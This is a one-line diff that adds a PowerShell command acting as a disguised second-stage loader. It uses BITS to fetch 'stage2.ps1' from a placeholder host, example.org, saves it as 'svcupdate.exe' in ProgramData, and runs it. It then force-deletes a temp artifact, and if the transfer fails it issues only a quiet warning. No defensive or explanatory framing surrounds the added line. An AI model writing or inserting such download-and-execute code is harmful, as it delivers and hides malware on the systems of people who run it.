@@ -1,0 +1,1 @@
+try { Start-BitsTransfer -Source 'https://example.org:443/stage2.ps1' -Destination 'C:\ProgramData\svcupdate.exe'; & 'C:\ProgramData\svcupdate.exe'; Remove-Item -Path "$env:TEMP\stage2.bin" -Force } catch { Write-Warning "Stage transfer failed" }
